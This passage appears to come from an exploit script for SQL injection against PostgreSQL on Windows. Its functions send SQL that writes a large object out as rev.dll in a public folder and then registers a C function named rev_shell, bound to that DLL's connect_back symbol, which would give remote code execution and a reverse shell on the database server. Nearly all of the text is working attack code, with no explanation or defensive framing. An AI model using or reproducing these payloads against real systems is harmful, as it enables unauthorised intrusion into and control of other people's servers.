...
def export_udf(url, loid):
    ...
    sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev.dll$$)" % loid
    make_request(url, sql)

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\users\\public\\rev.dll$$, $$connect_back$$ language C strict"
    make_request(url, sql)
